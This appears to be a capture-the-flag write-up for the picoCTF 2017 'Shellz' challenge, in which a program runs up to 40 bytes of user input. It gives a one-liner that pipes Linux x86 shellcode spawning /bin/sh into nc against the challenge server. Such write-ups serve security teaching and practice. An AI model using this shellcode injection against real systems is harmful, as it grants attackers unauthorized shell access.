# Shellz

## Question
  > You no longer have an easy thing to call, but you have more space. Program: shellz! Source. Connect on shell2017.picoctf.com:49324.
  
## Solution
### 1. Try running the program
  Then you try running the program,the program says "Give me 40 byte".So you give the program shellcode within 40 byte.
  
### 2. Search shellcode
Let's find  shellcode within 40 bytes from here! [shellcode-list](http://shell-storm.org/shellcode/)
I guess it is suspicious that linux x86 is suspicious.
  
### 3. Flag
  >(python -c'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x
68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; cat -) | nc shell2017.picoctf.com 49324

You can get flag by executing upper code.
